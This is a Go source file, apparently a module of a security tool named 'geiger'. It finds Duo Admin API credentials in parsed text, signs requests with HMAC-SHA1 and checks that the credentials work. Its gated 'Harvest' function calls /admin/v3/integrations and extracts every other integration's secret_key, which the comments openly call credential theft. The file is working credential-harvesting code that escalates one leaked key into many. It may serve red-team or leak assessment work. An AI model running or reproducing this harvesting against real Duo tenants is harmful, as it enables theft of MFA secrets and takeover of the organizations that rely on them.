package modules

import (
	"context"
	"encoding/base64"
	"net/http"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/puck-security/geiger/internal/module"
	"github.com/puck-security/geiger/internal/parse"
	"github.com/puck-security/geiger/internal/recognize"
	"github.com/puck-security/geiger/internal/recon"
	"github.com/puck-security/geiger/internal/sign"
)

// Duo Security Admin API. Unlike the other enterprise modules this one can't be
// a recipe: every request is signed with HMAC-SHA1 over a canonical
// Date+method+host+path+params string, placed in HTTP Basic as ikey:signature.
// The force multiplier is GET /admin/v3/integrations, which returns every other
// integration's secret_key in cleartext — so read access harvests Duo creds.

type duoAdmin struct{ module.Base }

func (duoAdmin) Name() string { return "duo" }

// duoSignedGET builds a Duo-signed GET request for path with the given params.
func duoSignedGET(ctx context.Context, host, ikey, skey, path string, params url.Values) (*http.Request, error) {
	date := time.Now().UTC().Format(time.RFC1123Z)
	canonParams := duoCanonParams(params)
	canon := strings.Join([]string{date, "GET", strings.ToLower(host), path, canonParams}, "\n")
	sig := sign.HMACSHA1Hex([]byte(skey), []byte(canon))

	u := "https://" + host + path
	if canonParams != "" {
		u += "?" + canonParams
	}
	req, err := recon.NewRequest(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Date", date)
	req.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(ikey+":"+sig)))
	return req, nil
}

// duoCanonParams renders params lexicographically sorted and RFC-3986 encoded,
// matching Duo's canonicalization (space as %20, not +).
func duoCanonParams(params url.Values) string {
	if len(params) == 0 {
		return ""
	}
	keys := make([]string, 0, len(params))
	for k := range params {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	var parts []string
	for _, k := range keys {
		vs := append([]string(nil), params[k]...)
		sort.Strings(vs)
		for _, v := range vs {
			parts = append(parts, duoEsc(k)+"="+duoEsc(v))
		}
	}
	return strings.Join(parts, "&")
}

func duoEsc(s string) string { return strings.ReplaceAll(url.QueryEscape(s), "+", "%20") }

func (m duoAdmin) Recon(ctx context.Context, c *recon.Client, _ module.Token, f module.Fields) ([]module.Finding, error) {
	host, ikey, skey := f["host"], f["ikey"], f["skey"]
	var out []module.Finding
	out = append(out, module.Finding{Key: "integration key", Value: ikey, Flag: module.FlagInfo})

	// users: validates the credential and sizes the directory.
	if req, err := duoSignedGET(ctx, host, ikey, skey, "/admin/v1/users", url.Values{"limit": {"1"}}); err == nil {
		if resp, err := c.Do(req, recon.CallOpts{}); err == nil && !resp.DryRun && resp.Status < 300 {
			if md, ok := jsonDecode(resp.Body)["metadata"].(map[string]any); ok {
				if n, ok := md["total_objects"].(float64); ok {
					out = append(out, module.Finding{Key: "users", Value: strconv.Itoa(int(n)), Flag: module.FlagInfo})
				}
			}
		}
	}

	if c.MinFootprint() {
		return out, nil
	}

	// integrations: each object exposes another integration's secret_key.
	if req, err := duoSignedGET(ctx, host, ikey, skey, "/admin/v3/integrations", url.Values{"limit": {"1"}}); err == nil {
		if resp, err := c.Do(req, recon.CallOpts{}); err == nil && !resp.DryRun && resp.Status < 300 {
			if md, ok := jsonDecode(resp.Body)["metadata"].(map[string]any); ok {
				if n, ok := md["total_objects"].(float64); ok {
					out = append(out, module.Finding{Key: "integrations", Value: strconv.Itoa(int(n)) + " (each exposes its secret_key — read = credential theft)", Flag: module.FlagForceMultiplier})
				}
			}
		}
	}
	return out, nil
}

// Harvest pulls every reachable integration's secret_key (gated).
func (m duoAdmin) Harvest(ctx context.Context, c *recon.Client, _ module.Token, f module.Fields) ([]module.Harvested, error) {
	if !c.Live() || !c.Intrusive() {
		return nil, nil
	}
	req, err := duoSignedGET(ctx, f["host"], f["ikey"], f["skey"], "/admin/v3/integrations", url.Values{"limit": {"100"}})
	if err != nil {
		return nil, nil
	}
	resp, err := c.Do(req, recon.CallOpts{Note: "duo list integrations (read-only, extracts secret_keys)"})
	if err != nil || resp.DryRun || resp.Status >= 300 {
		return nil, nil
	}
	arr, _ := jsonDecode(resp.Body)["response"].([]any)
	var out []module.Harvested
	for _, v := range arr {
		if len(out) >= enterpriseSecCap {
			break
		}
		im, ok := v.(map[string]any)
		if !ok {
			continue
		}
		skey, _ := im["secret_key"].(string)
		if skey == "" {
			continue
		}
		name, _ := im["name"].(string)
		if name == "" {
			name, _ = im["integration_key"].(string)
		}
		out = append(out, module.Harvested{Label: "duo integration:" + name, Value: skey})
	}
	return out, nil
}

func (duoAdmin) Summarize(title string, fs []module.Finding) module.Note {
	n := module.Note{Title: title, Findings: fs}
	if len(fs) <= 1 { // only the ikey echo, no successful call
		n.Invalid, n.Reason = true, "Duo signing rejected or no objects returned"
		return n
	}
	n.Summary = "Duo Admin API — full MFA tenant admin; reads other integrations' secret_keys"
	return n
}

func recognizeDuo(b parse.Blob, _ string, _ *module.Registry) []recognize.Match {
	ikey := firstVar(b.Vars, "DUO_IKEY", "DUO_INTEGRATION_KEY")
	skey := firstVar(b.Vars, "DUO_SKEY", "DUO_SECRET_KEY")
	host := firstVar(b.Vars, "DUO_API_HOSTNAME", "DUO_HOST", "DUO_APIHOST")
	if ikey == "" || skey == "" || host == "" {
		return nil
	}
	host = strings.TrimRight(strings.TrimPrefix(strings.TrimPrefix(host, "https://"), "http://"), "/")
	return []recognize.Match{{Module: "duo",
		Fields: module.Fields{"host": host, "ikey": ikey, "skey": skey},
		Secret: skey, Label: "DUO_SKEY", Line: b.Lines["DUO_SKEY"]}}
}

func init() {
	module.Register(duoAdmin{})
	recognize.RegisterRecognizer(recognizeDuo)
}
